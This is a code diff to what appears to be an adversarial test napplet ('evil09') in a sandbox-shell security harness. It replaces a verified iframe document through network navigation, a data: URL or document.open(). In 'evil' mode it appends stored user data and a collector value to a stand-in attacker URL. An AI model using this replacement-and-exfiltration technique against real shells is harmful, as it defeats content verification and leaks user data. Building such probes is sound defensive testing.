@@ -99,7 +99,7 @@ function stage2Html(cfg) {
     '}',
     'row("replaced-document", "document replaced in-frame", "armed",',
     '  (VIA === "data:-url" ? "this document loaded from a data: URL — NOT the verified srcdoc bytes. " : "document.open() replaced the Document in-place — same Window, brand-new Document. ") +',
-    '  "The iframe Window never changed, so a shell that maps (dTag, artifactHash) to the Window still treats these bytes as " + esc(C.dTag) + ".");',
+    '  "The iframe Window never changed, so a shell that maps (dTag, artifactHash) to the Window still treats these bytes as " + esc(C.dTag) + "." + (C.targetNote ? " [" + esc(C.targetNote) + "]" : ""));',
     'post({ type: "evil.stage2.report", report: fullReport() }); /* preliminary — proves the replacement booted even under shells that drop everything after it */',
     'async function main() {',
     '  var r = await rawGet("__evil09_victim__");',
@@ -155,6 +155,31 @@ function stage2Html(cfg) {
   ].join('\n');
 }
 
+/* Network replacement target (napplet/evil#3). Taken ONLY from the run
+   parameter `evil09-target` (see evilParam in the chrome) — never from
+   document.referrer, which a shell may legitimately empty, and never a
+   default external host.
+     absent / "" / "data"  → no network target: scheme-local data: replacement
+     absolute http(s) URL  → navigate the frame to it (stage-2 query appended)
+     anything else         → rejected, nothing navigates (row reads N/A) */
+const TARGET_PARAM = 'evil09-target';
+function resolveTarget() {
+  const raw = evilParam(TARGET_PARAM);
+  const v = raw == null ? '' : String(raw).trim();
+  if (v === '' || v.toLowerCase() === 'data') {
+    return {
+      kind: 'data',
+      note: 'target: scheme-local data: (' + (raw == null ? 'no ' + TARGET_PARAM + ' param' : TARGET_PARAM + '=' + (v === '' ? '""' : v)) + ')',
+    };
+  }
+  let u = null;
+  try { u = new URL(v); } catch (_) { /* not an absolute URL */ }
+  if (!u || (u.protocol !== 'http:' && u.protocol !== 'https:')) {
+    return { kind: 'rejected', value: v, why: u ? 'scheme ' + u.protocol + ' is not http(s)' : 'not an absolute URL' };
+  }
+  return { kind: 'network', url: u, note: 'target: ' + u.origin + u.pathname + ' (from run parameter ' + TARGET_PARAM + ')' };
+}
+
 // NAP-STORAGE (napplet/naps#3) names the injected methods getItem/setItem/
 // removeItem/keys (getItem → null on a miss). A shell exposing only the
 // pre-spec get/set/remove gets an explicit na naming that shape instead of a
@@ -166,6 +191,12 @@ function preSpecStorage(st) {
 }
 
 async function detonate(mode) {
+  // resolve the target BEFORE anything else: a rejected value must not
+  // navigate at all — not even to the scheme-local fallback
+  const tgt = resolveTarget();
+  if (tgt.kind === 'rejected') {
+    return na('rejected ' + TARGET_PARAM + '=' + JSON.stringify(tgt.value.slice(0, 80)) + ' (' + tgt.why + ') — only absolute http(s) URLs are network targets; set it empty or "data" for the scheme-local replacement. Nothing navigated: this is still the verified document.');
+  }
   // data this napplet was LEGITIMATELY given (through the injected domain)
   let seed = null;
   const st = window.napplet && window.napplet.storage;
@@ -185,39 +216,43 @@ async function detonate(mode) {
     marker: '__evil09_marker__=' + (mode === 'evil' ? 'armed' : 'demo'),
     data: mode === 'evil' && seed ? seed : 'demo-marker-no-real-data',
     collector: state.collector,
+    targetNote: tgt.note,
   };
   const html = stage2Html(cfg);
   const dataUrl = 'data:text/html;base64,' + b64utf8(html);
   // PRIMARY: network replacement — the realistic attack. A page fetched over
   // http(s) arrives with its own (attacker-chosen, i.e. absent) CSP: the
-  // injected meta died with the verified document. document.referrer is the
-  // shell URL (the evil-01 finding), so the fixture on the harness origin
-  // stands in for the attacker's server. No directive governs this navigation.
+  // injected meta died with the verified document. The host names the page
+  // via `evil09-target` (the harness passes its replace-target.html fixture
+  // as the attacker's stand-in). No directive governs this navigation.
   let target = null;
-  try {
-    const ref = new URL(document.referrer);
-    if (ref.protocol === 'http:' || ref.protocol === 'https:') {
-      target = ref.origin + '/harness/replace-target.html'
-        + '?marker=' + encodeURIComponent(cfg.marker)
-        + '&mode=' + cfg.mode
-        + '&csp=' + cfg.cspBefore
-        + '&dTag=' + encodeURIComponent(cfg.dTag)
-        + (mode === 'evil' ? '&collector=' + encodeURIComponent(cfg.collector) + '&data=' + encodeURIComponent(cfg.data) : '');
+  if (tgt.kind === 'network') {
+    const u = new URL(tgt.url.href);
+    u.searchParams.set('marker', cfg.marker);
+    u.searchParams.set('mode', cfg.mode);
+    u.searchParams.set('csp', cfg.cspBefore);
+    u.searchParams.set('dTag', cfg.dTag);
+    u.searchParams.set('target_src', TARGET_PARAM);
+    if (mode === 'evil') {
+      u.searchParams.set('collector', cfg.collector);
+      u.searchParams.set('data', cfg.data);
     }
-  } catch (_) { /* no usable referrer origin — foreign runtime: scheme-local fallback */ }
+    target = u.href;
+  }
+  const hrefBefore = safeGet(() => location.href);
   try { location.replace(target || dataUrl); } catch (_) { /* watchdog below */ }
   // FALLBACKS: same-frame navigation to a data: URL (unverified bytes, same
   // Window; note Chromium carries the policy container here, so the CSP may
   // survive this path), then in-place Document replacement (document.open).
   setTimeout(function () {
-    if (location.protocol === 'data:' || /replace-target\.html/.test(String(location.href))) return;
+    if (location.protocol === 'data:' || safeGet(() => location.href) !== hrefBefore) return;
     try { location.replace(dataUrl); } catch (_) { /* held */ }
     setTimeout(function () {
       if (location.protocol !== 'data:') {
         try { document.open(); document.write(html); document.close(); } catch (_) { /* held */ }
       }
     }, 600);
-  }, 800);
+  }, target ? 4000 : 800); /* a remote target may take a while to commit */
   // stage-2 carries the report from here; this UI dies with the verified document
   await new Promise(() => {});
 }
